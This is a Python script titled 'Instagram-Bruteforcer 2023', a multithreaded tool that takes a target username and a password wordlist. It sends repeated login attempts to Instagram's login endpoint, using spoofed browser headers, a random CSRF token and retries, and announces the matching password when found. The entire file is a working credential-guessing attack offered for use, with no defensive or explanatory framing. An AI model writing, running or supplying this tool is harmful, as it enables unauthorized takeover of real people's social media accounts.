#!/usr/bin/env python3

import requests
import argparse
import concurrent.futures
from datetime import datetime
from uuid import uuid4
from colorama import Fore, Style

# CORES ANSI
verde_limao_ansi = "\033[38;2;50;205;50m"
sublinhado_ansi = "\033[4m"
resetar_cores = "\033[0m"

ascii_art = Style.BRIGHT + Fore.BLUE + f"{sublinhado_ansi}Instagram-Bruteforcer 2023{resetar_cores}" + Style.RESET_ALL + Fore.RESET

# Time for the Instagram login request
time = int(datetime.now().timestamp())

# Set up argument parser
parser = argparse.ArgumentParser(description="Instagram Bruteforce Script")
parser.add_argument("-u", "--username", required=True, help="Instagram username to attack")
parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use for the attack")
parser.add_argument("-r", "--retries", type=int, default=3, help="Number of retries for each request")
args = parser.parse_args()

def login(username, wordlist, linha_wordlist, numero_linha_wordlist, session, retries):
    api_login = "https://www.instagram.com/accounts/login/ajax/"
    random_token = uuid4()
    
    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time}:{linha_wordlist}",
        "queryParams": {},
        "optIntoOneTap": "false"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": f"{random_token}"
    }

    # Retry logic
    for attempt in range(retries):
        try:
            req = session.post(api_login, data=payload, headers=headers, timeout=10)
            if "status" in req.text or "error" in req.text:
                print(Fore.RED + f"\r{numero_linha_wordlist} PASSWORDS TESTED...", end="", flush=True)
            else:
                print(Fore.GREEN + f"\n{linha_wordlist} PASSWORD CORRECT FOR '{username}'\n" + Fore.RESET)
                return  # Exit once the correct password is found
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f"Request failed: {e}. Retrying... ({attempt + 1}/{retries})" + Fore.RESET)
            continue

    # If the password is not correct after all retries, continue the attack
    print(Fore.RED + f"\r{numero_linha_wordlist} PASSWORDS TESTED...", end="", flush=True)

def start_thread(username, wordlist, threads, retries):
    session = requests.Session()  # Using a session to persist connections across requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        with open(wordlist, "rb") as f:
            for numero_linha_wordlist, linha in enumerate(f, 1):
                linha = linha.strip()
                executor.submit(login, username, wordlist, linha, numero_linha_wordlist, session, retries)

if __name__ == "__main__":
    if args.username and args.wordlist:
        username = args.username
        wordlist = args.wordlist
        threads = args.threads
        retries = args.retries

        print(f"{ascii_art}\n{verde_limao_ansi}ATTACKING {username} FROM WORDLIST {wordlist}...{resetar_cores}")

        # Start the attack with threading
        start_thread(username, wordlist, threads, retries)
    else:
        parser.print_help()
